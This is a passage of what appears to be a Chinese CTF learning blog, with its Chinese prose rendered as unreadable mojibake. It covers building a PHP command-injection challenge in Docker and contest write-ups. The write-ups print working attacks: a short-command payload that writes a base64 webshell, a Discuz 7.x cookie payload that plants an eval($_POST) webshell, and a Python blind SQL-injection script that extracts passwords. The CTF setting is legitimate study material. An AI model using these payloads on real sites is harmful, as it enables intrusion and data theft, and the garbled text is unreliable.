class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>if(strlen($_GET[1])&lt;=7)</code>è¿™é‡Œæˆ‘ä¸€å¼€å§‹æµ‹è¯•ç”¨çš„å°äº8ï¼Œç„¶åè¿™é‡Œæ”¹äº†ä¹Ÿæ²¡å†æµ‹è¯•ï¼Œæ„æ€éƒ½ä¸€æ ·ï¼Œç„¶åç½‘ä¸Šè¿™é‡Œç”¨çš„å°äº7ï¼Œè¿™æ ·çš„è¯7å­—ç¬¦æ ¹æœ¬å°±è¿‡ä¸äº†<br>è¨€å½’æ­£ä¼ ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctftraining/base_image_nginx_mysql_php_73</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;JokerY&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Blog=<span class="string">&quot;https://joker2763.github.io/&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files  /var/www/html  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><blockquote><p>FROMå°±æ˜¯æ‹‰å–ä¸€ä¸ªåŸºç¡€é•œåƒ<br>LABELå°±æ˜¯æ‰“æ ‡ç­¾ï¼Œè¯´æ˜ä½œè€…ç­‰<br><code>ENV LANG C.UTF-8</code>è¿™ä¸€å¥å°±æ˜¯ä½¿ç”¨utf-8ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç ï¼Œå½“ç„¶åœ¨è¿™ä¸ªé¢˜æ²¡æœ‰ä¸­æ–‡<br>COPYè¿™é‡Œå°±æ˜¯æŠŠæœåŠ¡å™¨çš„è§£é¢˜æ‰€éœ€æ–‡ä»¶æ”¾åˆ°dockerå®¹å™¨é‡Œé¢<br>EXPOSEæ˜¯æ˜ å°„åˆ°å®¿ä¸»æœºçš„ç«¯å£ï¼Œå°±æ˜¯æš´éœ²å®¹å™¨80ç«¯å£</p></blockquote><p>ç„¶åçœ‹ä¸€ä¸‹docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=flag&#123;This_is_flag&#125;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;2333:80&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>versionæŒ‡æ˜ymlæ–‡ä»¶çš„ç‰ˆæœ¬å·<br>serviceså°±æ˜¯ymlæ–‡ä»¶çš„ä¸»ä½“ï¼Œå®šä¹‰äº†æœåŠ¡äº†é…ç½®ã€‚bulidå°±æ˜¯åŸºäºdockerfileå¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œåé¢å°±æ˜¯dockerfileè·¯å¾„ï¼Œè¿™é‡Œä»£è¡¨dockerfileå’Œyamlæ–‡ä»¶åœ¨åŒä¸€è·¯å¾„ï¼Œenvironmentè¿™ä¸ªå°±æ˜¯å¼„åŠ¨æ€flagï¼Œè¿™é‡Œæˆ‘ä»¥åå¾€å¹³å°ä¸Šé¢˜å†å­¦ä¸€ä¸‹æ“ä½œï¼Œportsè¿™é‡Œ2333è¡¨ç¤ºæ˜ å°„çš„ç«¯å£ï¼Œ80è¿™é‡Œå’Œdockerfileè¦ä¸€æ ·</p></blockquote><p>è¿™æ ·ä¸€ä¸ªé¢˜ç›®æ­å»ºå°±åŸºæœ¬å®Œæˆäº†ï¼Œç„¶åå†å»æœåŠ¡å™¨è¿è¡Œdocker-compose.ymlæ–‡ä»¶å°±å¯ä»¥å¿«é€Ÿæ­å»ºé¢˜ç›®äº†<br><img src="https://s1.ax1x.com/2022/12/19/zLieKA.png" alt="zLieKA.png"><br>å¯ä»¥çœ‹åˆ°ç›´æ¥æ‰§è¡Œ<code>sudo  docker-compose up -d</code>å°±å¯ä»¥å¿«é€Ÿèµ·ä¸€ä¸ªç¯å¢ƒï¼Œè€Œä¸”è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªrce-web-1é•œåƒï¼Œå¹¶ä¸”è¿™é‡Œçœ‹åˆ°å®¹å™¨åˆ›å»ºæˆåŠŸ<br>è®¿é—®ä¸€ä¸‹ï¼Œçœ‹åˆ°é¢˜ç›®<br><img src="https://s1.ax1x.com/2022/12/19/zLiVvd.png" alt="zLiVvd.png"><br>æ‰“ä¸€ä¸‹<br>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp  </span><br><span class="line">&gt;1.p\\  </span><br><span class="line">&gt;d\&gt;\\  </span><br><span class="line">&gt;\ -\\  </span><br><span class="line">&gt;e64\\  </span><br><span class="line">&gt;bas\\  </span><br><span class="line">&gt;7\|\\  </span><br><span class="line">&gt;XSk\\  </span><br><span class="line">&gt;Fsx\\  </span><br><span class="line">&gt;dFV\\  </span><br><span class="line">&gt;kX0\\  </span><br><span class="line">&gt;bCg\\  </span><br><span class="line">&gt;XZh\\  </span><br><span class="line">&gt;AgZ\\  </span><br><span class="line">&gt;waH\\  </span><br><span class="line">&gt;PD9\\  </span><br><span class="line">&gt;o\ \\  </span><br><span class="line">&gt;ech\\  </span><br><span class="line">ls -t&gt;0  </span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨è„šæœ¬è‡ªåŠ¨æ‰§è¡Œï¼Œä½†æ˜¯ç½‘ä¸Šè„šæœ¬æˆ‘æ‰§è¡Œå‘ç°ä¸€å¥è¯å†™ä¸è¿›å»ï¼Œå¯èƒ½å“ªé‡Œæœ‰ç‚¹é—®é¢˜<br>ç›´æ¥æ‰‹åŠ¨å§<br>æˆåŠŸå†™å…¥<br><img src="https://s1.ax1x.com/2022/12/19/zLiA8e.png" alt="zLiA8e.png"><br>æ‹¿åˆ°flagï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯flag.phpçš„ä»£ç <br><img src="https://s1.ax1x.com/2022/12/19/zLii4O.png" alt="zLii4O.png"><br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆèšå‰‘è¿ä¸ä¸Šï¼Œå¯èƒ½æ˜¯æˆ‘ç¯å¢ƒæœ‰é—®é¢˜ï¼Œä»¥åæ­å»ºæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®å†ç»†ç»†ç ”ç©¶ä¸€ä¸‹</p>]]></content>
      
      
      <categories>
          
          <category> Doker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ æ­å»ºä¸€ä¸ªç®€å•é¢˜</title>
      <link href="/2022/12/%E5%AD%A6%E4%B9%A0%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E9%A2%98/"/>
      <url>/2022/12/%E5%AD%A6%E4%B9%A0%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³äºç”¨dockerå‡ºé¢˜çš„æ–‡ç« å®åœ¨æ˜¯å¤ªå°‘äº†ï¼Œæ‰€ä»¥è‡ªå·±åœ¨å­¦ä¹ çš„æ—¶å€™è®°å½•ä¸€ä¸‹<br>dockerçš„ä¸€äº›åŸºæœ¬æ­å»ºåœ¨è¿™é‡Œå°±ä¸ä¸€ä¸€è¯´æ˜äº†ï¼Œè¿™é‡Œåªè®°å½•ä¸€ä¸‹å¦‚ä½•æŠŠä¸€ä¸ªé¢˜ç›®å¼„å‡ºæ¥ï¼Œå¯èƒ½æœ‰äº›åœ°æ–¹ä¹Ÿæœ‰é”™è¯¯</p><h2 id="è¿›å…¥ä¸»é¢˜"><a href="#è¿›å…¥ä¸»é¢˜" class="headerlink" title="è¿›å…¥ä¸»é¢˜"></a>è¿›å…¥ä¸»é¢˜</h2><p>æŒ‰æˆ‘è‡ªå·±çš„ç†è§£å°±æ˜¯å…ˆæ‹‰å–ä¸€ä¸ªé•œåƒç”¨æ¥å¸ƒç½®é¢˜ç›®æ‰€éœ€çš„ç¯å¢ƒä»¥åŠå®¹å™¨æ‰€éœ€<br>æˆ‘è¿™é‡Œä½¿ç”¨<code>ctftraining/base_image_nginx_mysql_php_73</code> è¿™ä¸ªé•œåƒä¸€å¼€å§‹æˆ‘ç”¨çš„<code>tutum/lamp</code><br>ä½†æ˜¯å‘ç°è¿™ä¸ªé•œåƒæœ‰ç‚¹é—®é¢˜ä¸èƒ½æ˜¾ç¤ºä¸­æ–‡ï¼Œå¯èƒ½æ˜¯dockerfileæ²¡è®¾ç½®<br>æ‹‰å–é•œåƒ<code>docker pull ctftraining/base_image_nginx_mysql_php_73 </code><br>è¿™é‡Œæˆ‘å·²ç»æ‹‰å–äº†ï¼Œæ‰€ä»¥åˆ—ä¸€ä¸‹<br><img src="https://s1.ax1x.com/2022/12/15/zo0fQs.png" alt="zo0fQs.png"><br>ç„¶åä½¿ç”¨ctftraining&#x2F;base_image_nginx_mysql_php_73é•œåƒå¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼ŒåŒæ—¶æ˜ å°„åˆ°æœåŠ¡å™¨çš„2333ç«¯å£<br><code> docker run -d -p 2333:80 ctftraining/base_image_nginx_mysql_php_73</code><br><img src="https://s1.ax1x.com/2022/12/15/zo0Rzj.png" alt="zo0Rzj.png"><br>å¯ä»¥çœ‹åˆ°å·²ç»å¯åŠ¨äº†ä¸€ä¸ªå®¹å™¨ï¼Œç„¶åå°±æ˜¯å¼„å‡ºé¢˜æ–‡ä»¶äº†ï¼Œå…ˆä¸Šä¼ åˆ°æœåŠ¡å™¨çš„&#x2F;var&#x2F;www&#x2F;htmlä¸‹<br>ä¸€ä¸ªç®€å•çš„æŠ“åŒ…æŸ¥çœ‹æºç çš„é¢˜ï¼Œå› ä¸ºä¸»è¦æ˜¯å­¦ä¹ æ€ä¹ˆå¸ƒç½®ä¸€ä¸ªé¢˜ç›®ï¼Œæ‰€ä»¥ç›´æ¥åˆ°ç½‘ä¸Šæ‰¾çš„ä¸€ä¸ªæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&quot;font-family:arial;color:black;font-size:20px;text-align:center;&quot;</span>&gt;Flagä¸åœ¨è¿™é‡Œå“¦&lt;/p&gt;  </span><br><span class="line">&lt;!-- flag&#123;This_is_flag&#125; --&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;script&gt;  </span><br><span class="line"> document.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">   <span class="title function_ invoke__">alert</span>(<span class="string">&quot;å³é”®è¢«ç¦ç”¨&quot;</span>);  </span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">  &#125;;  </span><br><span class="line"> document.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">    e = window.event || e;  </span><br><span class="line">    <span class="keyword">var</span> k = e.keyCode;  </span><br><span class="line">    <span class="comment">//å±è”½ctrl+uï¼ŒF12é”®  </span></span><br><span class="line">    <span class="keyword">if</span> ((e.ctrlKey == <span class="literal">true</span> &amp;&amp; k == <span class="number">85</span>) || k == <span class="number">123</span>) &#123;  </span><br><span class="line">      <span class="keyword">if</span> (k == <span class="number">85</span>)  </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;Ctrl+Uè¢«ç¦ç”¨!&quot;</span>);  </span><br><span class="line">      <span class="keyword">else</span>   </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;F12è¢«ç¦ç”¨!&quot;</span>);  </span><br><span class="line">      e.keyCode = <span class="number">0</span>;  </span><br><span class="line">      e.returnValue = <span class="literal">false</span>;  </span><br><span class="line">      e.cancelBubble = <span class="literal">true</span>;  </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠé¢˜ç›®çš„æºç ä»æœåŠ¡å™¨copyåˆ°å®¹å™¨ä¸­<br><code>docker cp /var/www/html/index.php 603788:/var/www/html/</code><br>å®¹å™¨idä¸ç”¨å†™å…¨åªè¦èƒ½è¯†åˆ«å‡ºæ¥å°±è¡Œï¼Œæ‰§è¡Œä¹‹åè®¿é—®å°±è¡Œ<br>è®¿é—®<code>æœåŠ¡å™¨ip:2333</code><br><img src="https://s1.ax1x.com/2022/12/15/zo02WQ.png" alt="zo02WQ.png"><br>å¸ƒç½®æˆåŠŸ<br><img src="https://s1.ax1x.com/2022/12/15/zo0cFS.png" alt="zo0cFS.png"><br>ç„¶åæŠ“åŒ…å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2022/12/15/zo0gJg.png" alt="zo0gJg.png"><br>ç„¶åå°±æ˜¯dockerfileå’Œdocker-compose.ymlçš„ç¼–å†™ï¼Œç”¨æ¥å¿«é€Ÿæœ¬åœ°éƒ¨ç½²å’ŒåŠ¨æ€flagå®ç°ç­‰ï¼Œè¿™é‡Œå°±å…ˆä¸å†™äº†,å½“ç„¶é‚£ä¸ªä¹Ÿæ˜¯å¾ˆé‡è¦çš„ä¸œè¥¿<br>æœ€åè¿™é‡Œåˆ—ä¸€ä¸‹æˆ‘æœ€è¿‘ç»å¸¸ç”¨çš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exit //é€€å‡ºå®¹å™¨</span><br><span class="line">systemctl restart docker  //é‡å¯docker</span><br><span class="line">docker start å®¹å™¨id  //å¼€å¯ä¸€ä¸ªå·²çŸ¥idçš„å®¹å™¨</span><br><span class="line">docker restart å®¹å™¨id  //é‡æ–°å¯åŠ¨å®¹å™¨</span><br><span class="line">docker exec -it  å®¹å™¨id bash  //é€€å‡ºå®¹å™¨åå®¹å™¨ä¸å…³é—­</span><br><span class="line">docker stop å®¹å™¨id  //ç»“æŸå®¹å™¨</span><br><span class="line">docker ps  //æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker image ls  //æŸ¥çœ‹é•œåƒç›®å½•</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/Cypher_X/article/details/115359957">CTF Webå‡ºé¢˜æ„Ÿæ‚Ÿ_Wuuconixçš„åšå®¢-CSDNåšå®¢_ctf webå‡ºé¢˜</a><br><a href="https://blog.csdn.net/m0_62422842/article/details/126604577?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-126604577-blog-115359957.pc_relevant_multi_platform_whitelistv4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-126604577-blog-115359957.pc_relevant_multi_platform_whitelistv4&utm_relevant_index=5">ç”¨dockeræ­å»ºç®€æ˜“ctfé¢˜ç›®_XiLitterçš„åšå®¢-CSDNåšå®¢_ctfé¢˜ç›®docker</a></p>]]></content>
      
      
      <categories>
          
          <category> Doker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¼±å£ä»¤æ‹›æ–°èµ›wp(éƒ¨åˆ†)</title>
      <link href="/2022/11/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%8B%9B%E6%96%B0%E8%B5%9Bwp-%E9%83%A8%E5%88%86/"/>
      <url>/2022/11/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%8B%9B%E6%96%B0%E8%B5%9Bwp-%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ç­¾åˆ°å°èƒ½æ‰‹"><a href="#ç­¾åˆ°å°èƒ½æ‰‹" class="headerlink" title="ç­¾åˆ°å°èƒ½æ‰‹"></a>ç­¾åˆ°å°èƒ½æ‰‹</h2><p>ç›´æ¥æ‰«ç›®å½•å‘ç°æœ‰ä¸ªindex.php.bakä¸‹è½½æ‰“å¼€å¾—åˆ°</p><h2 id="å¼€èƒƒèœ"><a href="#å¼€èƒƒèœ" class="headerlink" title="å¼€èƒƒèœ"></a>å¼€èƒƒèœ</h2><p>lsæ ¹ç›®å½•çœ‹åˆ°flag<br><img src="https://s1.ax1x.com/2022/11/19/zuy5qO.png" alt="zuy5qO.png"><br>ç„¶åcatï¼Œè¿™é‡Œå¥½åƒå¯ä»¥å¿½ç•¥ç©ºæ ¼ï¼Œå¯èƒ½æ˜¯éé¢„æœŸå§ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ç”¨nlç›´æ¥å‡ºæ¥<br><img src="https://s1.ax1x.com/2022/11/19/zuy4sK.png" alt="zuy4sK.png"></p><h2 id="å°é•‡åšé¢˜å®¶"><a href="#å°é•‡åšé¢˜å®¶" class="headerlink" title="å°é•‡åšé¢˜å®¶"></a>å°é•‡åšé¢˜å®¶</h2><p>æ‰«å‡ºæ¥robots.txtï¼Œè®¿é—®&#x2F;GAME&#x2F;index.htmlæŸ¥çœ‹jsä»£ç <br><img src="https://s1.ax1x.com/2022/11/19/zuyWxx.png" alt="zuyWxx.png"><br>base64è§£ç è®¿é—®&#x2F;GAME&#x2F;f14g_in_there_hha&#x2F;index.php<br>ç„¶åGAME&#x2F;f14g_in_there_hha&#x2F;index.php?payload&#x3D;;cat%09&#x2F;*</p><h2 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h2><p>å‚è€ƒè¿™ç¯‡æ–‡ç« (<a href="https://cloud.tencent.com/developer/article/1541130">Discuz 7.x&#x2F;6.x å…¨å±€å˜é‡é˜²å¾¡ç»•è¿‡å¯¼è‡´ä»£ç æ‰§è¡Œæ¼æ´å¤ç° - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a>)<br>ç›´æ¥è®¿é—®å­˜åœ¨æ¼æ´çš„åœ°æ–¹ä½†æ˜¯åœ¨tidè¿™é‡Œå›°äº†å¾ˆä¹…<br><img src="https://s1.ax1x.com/2022/11/19/zuyhM6.png" alt="zuyhM6.png"><br>ç„¶åä¸€ç›´æ‰¾ç»ˆäºåˆæ‰¾åˆ°ä¸€ç¯‡åšå®¢(<a href="https://www.freebuf.com/vuls/262488.html">discuz7.2æ¼æ´å¤ç°â€“pythonç¼–å†™poc - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a>)</p><p><img src="https://s1.ax1x.com/2022/11/19/zuyRR1.png" alt="zuyRR1.png"></p><p>ç›´æ¥tidæ”¹ä¸º10ï¼Œè¿æ°”ä¸é”™æ‹¿åˆ°shell<br><img src="https://s1.ax1x.com/2022/11/19/zuyTde.png" alt="zuyTde.png"><br>æ¥ä¸‹æ¥æŠŠwebshellå†™å…¥ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))</span><br></pre></td></tr></table></figure><p>åŒæ ·ä¼ ç»™cookieï¼Œè¿™é‡Œæ˜¯åˆ›å»ºäº†ä¸€ä¸ªwf.phpå¯†ç ä¸ºlalalalï¼Œè®¿é—®ä¸€ä¸‹è¿™ä¸ªç•Œé¢<br><img src="https://s1.ax1x.com/2022/11/19/zuyoZD.png" alt="zuyoZD.png"><br>æ²¡æœ‰æŠ¥é”™è¯´æ˜å†™å…¥æˆåŠŸï¼Œèšå‰‘è¿ä¸Šç»ˆç«¯catå°±è¡Œ<br><img src="https://s1.ax1x.com/2022/11/19/zucTCd.png" alt="zucTCd.png"></p><h2 id="Queen"><a href="#Queen" class="headerlink" title="Queen"></a>Queen</h2><p>è¿™ä¸ªé¢˜æ¯”èµ›æ—¶æ²¡å¼„å‡ºæ¥ï¼Œlimitæ³¨å…¥ä¸å¤ªç†Ÿæ‚‰</p><p><img src="https://s1.ax1x.com/2022/11/19/zu2uTS.png" alt="zu2uTS.png"><br>éœ€è¦ä¼ªé€ ipç”¨X-Forwarded-For:127.0.0.1æ¥ä¼ªé€ <br><img src="https://s1.ax1x.com/2022/11/19/zucbvt.png" alt="zucbvt.png"><br>ä½†æ˜¯è·³è½¬åˆ°302äº†å¹¶ä¸”ç™»å½•å¤±è´¥ï¼Œæœ€åç”¨limitæ‰¾åˆ°æ³¨å…¥ç‚¹<br><img src="https://s1.ax1x.com/2022/11/19/zuc78A.png" alt="zuc78A.png"><br><img src="https://s1.ax1x.com/2022/11/19/zucI4H.png" alt="zucI4H.png"><br>ç›²æ³¨å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&#x27;http://d9960516-2ae7-4792-806e-90afce237a56.recruit.qsnctf.com:8080/login.php&#x27;</span>  </span><br><span class="line">headers = &#123;  </span><br><span class="line">    <span class="string">&quot;x-forwarded-for&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;or (ascii(substr((select(group_concat(Password))from(user)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#&#x27;&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;user&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(Password))from(user)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  </span><br><span class="line">    <span class="built_in">print</span>(i)  </span><br><span class="line">    left = <span class="number">32</span>  </span><br><span class="line">    right = <span class="number">127</span>  </span><br><span class="line">    mid = (left + right) // <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">while</span> left &lt; right:  </span><br><span class="line">        payload_flag=payload.<span class="built_in">format</span>(i,mid)  </span><br><span class="line">        data = &#123;  </span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;password&quot;</span>: payload_flag  </span><br><span class="line">        &#125;  </span><br><span class="line">        r = requests.post(headers=headers, url=url, data=data, allow_redirects=<span class="literal">True</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            left = mid + <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            right = mid  </span><br><span class="line">        mid = (left + right) // <span class="number">2</span>  </span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">127</span> <span class="keyword">or</span> mid == <span class="number">32</span>:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    flag += <span class="built_in">chr</span>(right)  </span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/11/19/zu2cm6.png" alt="zu2cm6.png"></p><p>è¿™ä¸ªè„šæœ¬æœ‰ç‚¹é—®é¢˜ï¼Œåªæœ‰çˆ†flagçš„payloadæœ‰ç”¨ï¼Œå…¶å®ƒçš„ä¸å®Œæ•´ï¼Œåé¢å¤ç°å†æ¥æ”¹æ”¹</p><h2 id="Where"><a href="#Where" class="headerlink" title="Where"></a>Where</h2><p>ç›´æ¥æ‰«ç›®å½•æœ‰ä¸ªadminï¼Œç„¶åç™»å½•ï¼Œçœ‹æºç å‘ç°éªŒè¯ç æ˜¯å›¾ç‰‡ï¼Œé‚£ä¹ˆåº”è¯¥ä¸æ˜¯è¿›å…¥åå°äº†ï¼Œåœ¨urlä¸Šé¢å‘ç°base64åŠ å¯†çš„ä¸œè¥¿è§£ç ä¸€ä¸‹<br><img src="https://s1.ax1x.com/2022/11/19/zu2OAS.png" alt="zu2OAS.png"><br>åœ¨è¿™ä¸ªç›®å½•ä¸‹ä½†æ˜¯å®ƒæ˜¯ä¸å¯è®¿é—®çš„ï¼Œäºæ˜¯è¯•äº†ä¸€ç³»åˆ—ç»•è¿‡ç»“æœä¸è¡Œï¼Œ<br><img src="https://s1.ax1x.com/2022/11/19/zucLKP.png" alt="zucLKP.png"><br>çœ‹åˆ°è¿™ä¸ªç›®å½•æœ‰ä¸ªevalå‡½æ•°å¯èƒ½æœ‰é—®é¢˜ï¼Œæœä¸å…¶ç„¶(<a href="https://blog.csdn.net/weixin_43416469/article/details/114157361">PHPUnitè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-9841 